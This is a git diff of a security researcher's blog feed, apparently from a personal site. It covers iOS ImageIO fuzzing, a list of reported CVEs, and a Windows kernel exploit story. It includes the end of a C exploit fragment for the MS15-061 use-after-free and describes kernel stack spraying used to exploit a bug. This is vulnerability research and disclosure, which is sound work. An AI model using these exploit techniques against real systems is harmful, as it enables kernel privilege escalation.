+        <span class="n">ShowWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">UpdateWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
+        <span class="c1">// Triger UserMode CallBack</span>
+        <span class="n">SetClassLongPtr</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">GCLP_HICON</span><span class="p">,</span> <span class="p">(</span><span class="n">LONG_PTR</span><span class="p">)</span><span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">));</span>
+
+        <span class="n">SendMessageW</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">WM_NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges.]]></summary></entry><entry><title type="html">ImageIO, the infamous iOS Zero Click Attack Vector.</title><link href="http://localhost:4000/fuzzing/2024/03/29/iOSImageIO.html" rel="alternate" type="text/html" title="ImageIO, the infamous iOS Zero Click Attack Vector." /><published>2024-03-29T10:27:59+01:00</published><updated>2024-03-29T10:27:59+01:00</updated><id>http://localhost:4000/fuzzing/2024/03/29/iOSImageIO</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/03/29/iOSImageIO.html"><![CDATA[<p>ImageIO is Apple’s Framework that handles image parsing, which exposes 0click attack surface</p>
+
+<p>Months after reading <a href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html">this blog post from Google Project Zero</a> about fuzzing ImageIO, I used LLDB to examine the testHeader functions, it turned out there are three new <mark>testHeader</mark> functions for different file formats.</p>
 
 <p>such as <mark>KTX2</mark> and <mark>WebP</mark> and <mark>ETC</mark>, so because they were fairly new I thought maybe they have not been fuzzed by Project Zero.</p>
 
@@ -8,13 +1004,13 @@
 1.26: where <span class="o">=</span> ImageIO<span class="sb">`</span>IIO_Reader_WebP::testHeader<span class="o">(</span>unsigned char const<span class="k">*</span>, unsigned long, __CFString const<span class="k">*</span><span class="o">)</span>, address <span class="o">=</span> 0x00007ff81341f368, resolved, hit count <span class="o">=</span> 0 
 1.31: where <span class="o">=</span> ImageIO<span class="sb">`</span>IIO_Reader_ETC::testHeader<span class="o">(</span>unsigned char const<span class="k">*</span>, unsigned long, __CFString const<span class="k">*</span><span class="o">)</span>, address <span class="o">=</span> 0x00007ff8134dd1c6, resolved, hit count <span class="o">=</span> 2</code></pre></figure>
 
-<p>KTX2 is a relatively new specification introduced after the Project Zero fuzzing efforts. Arguably, its source code is also new. Further information about KTX2 can be found in its specification document here: https://registry.khronos.org/KTX/specs/2.0/ktxspec_v2.html.</p>
+<p>KTX2 is a relatively new specification introduced after the Project Zero fuzzing efforts. Arguably, its source code is also new. Further information about KTX2 can be found in its specification document here: <a href="https://registry.khronos.org/KTX/specs/2.0/ktxspec_v2.html">khronos.org</a>.</p>
 
-<p>Although WebP has not been fuzzed by Project Zero, it is fuzzed with Google OSS. So, I decided not to compete with Google’s fuzzer in this regard.</p>
+<p>Although WebP has not been fuzzed by Project Zero, it is fuzzed with Google OSS-Fuzz. So I decided not to compete with Google’s fuzzer in this regard.</p>
 
-<p>Another important issue I noticed was that in the Project Zero’s blog, ImageIO was using OpenEXR, but in my test, ImageIO was using Apple’s closed-source new implementation of EXR in libAppleEXR.dylib. Therefore, I decided to fuzz these two file formats, EXR and KTX2.</p>
+<p>Another important issue I noticed was that in the Project Zero’s blog, ImageIO was using <mark>OpenEXR</mark>, but in my test, ImageIO was using Apple’s closed-source new implementation of EXR in <mark>libAppleEXR.dylib</mark>. Therefore, I decided to fuzz these two file formats, EXR and KTX2.</p>
 
-<p>the Samuel Groß has modifed Honggfuzz to have a binary Coverage-guided fuzzing. but I ported Project Zero’s harness to Jackalope fuzzer (awesome project thanks to Ivan Fratric), also I used initWithData method of NSImage and in memory fuzzing option of Jackalope to make the fuzzing faster.</p>
+<p>the Samuel Groß has modifed Honggfuzz to have a binary Coverage-guided fuzzing. but I ported Project Zero’s harness to <a href="https://github.com/googleprojectzero/Jackalope">Jackalope fuzzer</a> (awesome project thanks to Ivan Fratric), also I used  <mark>initWithData</mark> method of NSImage and in-memory fuzzing option of Jackalope to make the fuzzing faster.</p>
 
 <p>I managed to find lots of KTX2 sample files in the following pages:</p>
 <ul>
@@ -24,7 +1020,7 @@
 
 <p>you can also use <mark>DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib</mark> to increase the change of finding more bugs.</p>
 
-<p>My fuzzing effort found several vulnerablities you can see them in my <a href="https://r00tkitsmm.github.io/fuzzing/2024/03/27/CVEs.html">CVEs page</a></p>
+<p>My fuzzing effort found several vulnerabilities, you can see them in my <a href="https://r00tkitsmm.github.io/fuzzing/2024/03/27/CVEs.html">CVEs page</a></p>
 
 <figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;Foundation/Foundation.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;Foundation/NSURL.h&gt;</span><span class="cp">
@@ -132,8 +1128,9 @@
 
 <p>this vulnerablity is interesting for three reseaons</p>
 <ul>
+  <li>it’s a tweetable vulnerablity :)</li>
   <li>it gave Write arbitrary data to arbitrary address primitive.</li>
-  <li>it has an amusing story associated with it. after my discovery of this vulnerability, I shared a tweet about it, which caught the attention of researchers from Microsoft. Remarkably, they were able to discern the root cause of the vulnerability simply by examining my tweet.
+  <li>it has an amusing story associated with it. after my discovery of this vulnerability, I <a href="https://web.archive.org/web/20190420082929/https://twitter.com/R00tkitSMM/status/656214430464786432">shared a tweet</a> about it, which caught the attention of researchers from Microsoft. Remarkably, they were able to discern the root cause of the vulnerability simply by examining my tweet.
 you can read their story in <a href="https://msrc.microsoft.com/blog/2017/06/tales-from-the-msrc-from-pixels-to-poc/">MSRC blog</a></li>
 </ul>
 
@@ -305,147 +1302,12 @@ CTL_CODE(FILE_DEVICE_UNKNOWN, WmiEnumerateGuidList, METHOD_BUFFERED, FILE_READ_A
  
     <span class="p">}</span>
  
-<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[Update:]]></summary></entry><entry><title type="html">CVEs and reported vulnerabilities</title><link href="http://localhost:4000/fuzzing/2024/03/27/CVEs.html" rel="alternate" type="text/html" title="CVEs and reported vulnerabilities" /><published>2024-03-27T22:27:59+01:00</published><updated>2024-03-27T22:27:59+01:00</updated><id>http://localhost:4000/fuzzing/2024/03/27/CVEs</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/03/27/CVEs.html"><![CDATA[<p>Some vulnerabilities I’ve reported include an intriguing story behind CVE-2016-0040, which you can explore in <a href="https://msrc.microsoft.com/blog/2017/06/tales-from-the-msrc-from-pixels-to-poc/"> Microsoft’s blog post</a></p>
+<span class="p">}</span></code></pre></figure>
 
-<p>the CVE-2022-22587 vulnerability also has collision with in the wild exploits. read more about info
-Some vulnerabilities I’ve reported include an intriguing story behind CVE-2016-0040, which you can explore in <a href="https://thehackernews.com/2022/12/new-actively-exploited-zero-day.html"> thehackernews</a></p>
+<p>in order to exploit this vulnerablity we have to spary kernel stack memory, after talking with Mateusz Jurczyk he told me about 
+<a href="https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/">using nt!NtMapUserPhysicalPages an excellent technique to Spraying Kernel Stack memory</a></p>
 
-<table>
-  <thead>
-    <tr>
-      <th>CVE</th>
-      <th>Description</th>
-      <th>Source</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>CVE-2016-0087</td>
-      <td>Windows kernel Privilege escalation Vulnerability - Type Confusion</td>
-      <td>GitHub Link, Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2016-0040</td>
-      <td>Windows kernel Privilege escalation Vulnerability - Uninitialized pointer</td>
-      <td>GitHub Link, Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2016-7627</td>
-      <td>A null pointer dereference in iOS/OSX</td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td>CVE-2017-0167</td>
-      <td>Microsoft Windows Kernel Information Disclosure Vulnerability, bypassing ASLR</td>
-      <td>Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2019-1250</td>
-      <td>Microsoft Jet Database Engine Remote Code Execution Vulnerabilities</td>
-      <td>Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2020-0992</td>
-      <td>Microsoft Jet Database Engine Remote Code Execution Vulnerabilities</td>
-      <td>Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2020-1008</td>
-      <td>Microsoft Jet Database Engine Remote Code Execution Vulnerabilities</td>
-      <td>Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2020-0889</td>
-      <td>Microsoft Jet Database Engine Remote Code Execution Vulnerabilities</td>
-      <td>Microsoft Security Blog</td>
-    </tr>
-    <tr>
-      <td>CVE-2020-0634</td>
-      <td>Microsoft Windows CLFS Use-After-Free Privilege Escalation Vulnerability</td>
-      <td>Zero Day Initiative Advisory</td>
-    </tr>
-    <tr>
-      <td>CVE-2020-0961</td>
-      <td>Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability</td>
-      <td>Zero Day Initiative Advisory</td>
-    </tr>
-    <tr>
-      <td>CVE-2020-17395</td>
-      <td>Parallels Desktop integer underflow VM escape Vulnerability</td>
-      <td>Zero Day Initiative Advisory</td>
-    </tr>
-    <tr>
-      <td>CVE-2022-34890</td>
-      <td>Local attackers disclose sensitive information on Parallels Desktop</td>
-      <td>Zero Day Initiative Advisory</td>
-    </tr>
-    <tr>
-      <td>CVE-2022-22587</td>
-      <td>iOS kernel Memory Corruption. Impact: Arbitrary code execution with kernel privileges</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-32384</td>
-      <td>Buffer overflow in iOS ImageIO. Impact: Arbitrary code execution</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-23519</td>
-      <td> </td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-32372</td>
-      <td>Out-of-bounds read in iOS ImageIO.</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-27929</td>
-      <td>Out-of-bounds read in iOS ImageIO.</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-27948</td>
-      <td>Out-of-bounds read addressed with improved input validation.</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-27947</td>
-      <td>Out-of-bounds read addressed with improved input validation.</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-21643</td>
-      <td>Qualcomm Security Bulletins</td>
-      <td>Security Bulletin</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-21651</td>
-      <td>Qualcomm Security Bulletins</td>
-      <td>Security Bulletin</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-42899</td>
-      <td>Processing an image may lead to arbitrary code execution in iOS, MacOS</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-42865</td>
-      <td>Processing an image may lead to arbitrary code execution in iOS, MacOS</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2023-42862</td>
-      <td>Processing an image may lead to arbitrary code execution in iOS, MacOS</td>
-      <td>Apple Support</td>
-    </tr>
-    <tr>
-      <td>CVE-2024-23264</td>
-      <td>An application may be able to read restricted memory in iOS, MacOS</td>
-      <td>Apple Support</td>
-    </tr>
-  </tbody>
-</table>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[Some vulnerabilities I’ve reported include an intriguing story behind CVE-2016-0040, which you can explore in Microsoft’s blog post]]></summary></entry><entry><title type="html">Structure-Aware linux kernel Fuzzing with libFuzzer</title><link href="http://localhost:4000/fuzzing/2024/03/27/libffuzzerkernel.html" rel="alternate" type="text/html" title="Structure-Aware linux kernel Fuzzing with libFuzzer" /><published>2024-03-27T22:27:59+01:00</published><updated>2024-03-27T22:27:59+01:00</updated><id>http://localhost:4000/fuzzing/2024/03/27/libffuzzerkernel</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/03/27/libffuzzerkernel.html"><![CDATA[<p>Hi everyone! I’m really happy to tell you about my experimenting adventure today.
+<p>with help of above method I managed to exploit this vulnerablity and I had a plan to participate to <mark>Pwn2Own</mark> in windows kernel catagorty, but Microsoft spotted my vulnerablity with a simple miskate I did by tweeting about it.</p>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[Update:]]></summary></entry><entry><title type="html">Structure-Aware linux kernel Fuzzing with libFuzzer</title><link href="http://localhost:4000/fuzzing/2024/03/27/libffuzzerkernel.html" rel="alternate" type="text/html" title="Structure-Aware linux kernel Fuzzing with libFuzzer" /><published>2024-03-27T22:27:59+01:00</published><updated>2024-03-27T22:27:59+01:00</updated><id>http://localhost:4000/fuzzing/2024/03/27/libffuzzerkernel</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/03/27/libffuzzerkernel.html"><![CDATA[<p>Hi everyone! I’m really happy to tell you about my experimenting adventure today.
 I decided to experiment with <mark>KCOV</mark> and see how I can hook it into libfuzzer and boot the kernel without spending too much on building a root file system.</p>
 
 <p>First of all why not just using syzkaller? because why not? this may cover more State space.</p>
